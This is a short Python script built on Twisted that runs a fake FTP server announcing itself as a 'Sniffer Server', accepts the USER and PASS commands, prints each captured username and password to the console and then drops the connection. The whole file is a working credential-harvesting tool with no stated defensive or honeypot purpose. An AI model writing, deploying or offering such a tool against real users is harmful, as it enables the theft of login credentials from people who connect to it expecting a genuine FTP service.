#!/usr/bin/env python

from twisted.protocols.basic import LineReceiver
from twisted.internet.protocol import Factory
from twisted.internet import reactor
from optparse import OptionParser

class FtpGrabber(LineReceiver):
  def connectionMade(self):
    self.transport.write("220 Sniffer Server\n")
    
  def lineReceived(self, line):
    chunks = line.split()
    invalid_command = True
    
    #Check the chunks and see if the first word is something we can handle
    if len(chunks) > 0 and hasattr(self, "handle_%s" % chunks[0].lower()):
      function = getattr(self, "handle_%s" % chunks[0].lower())
      if callable(function):
        #function returns success
        invalid_command = not function(line)
    
    if invalid_command:
      self.transport.loseConnection()
  
  def handle_user(self, line):
    #Usernames may contain spaces, so dont use split
    #Defer printing to when password is sent to not mix concurrent connections
    self.username = line[5:]
    
    #331 means authorization required
    self.transport.write("331 BRO NEED DAT PASS\n")
    
    #Continue connection
    return True
  
  def handle_pass(self, line):
    #Password may contain spaces, so dont use split
    print "Username: %s" % self.username
    print "Password: %s" % line[5:]
    
    #Lose connecion
    return False

if __name__ == "__main__":
  parser = OptionParser()
  parser.add_option('-p', '--port', dest='port',
                                    type='int',
                                    help='Port to bind to',
                                    default=9001) #It's over 9000!
  
  options, args = parser.parse_args()
  
  factory = Factory()
  factory.protocol = FtpGrabber
  
  print "Listening on port %d" % options.port
  
  reactor.listenTCP(options.port, factory)
  reactor.run()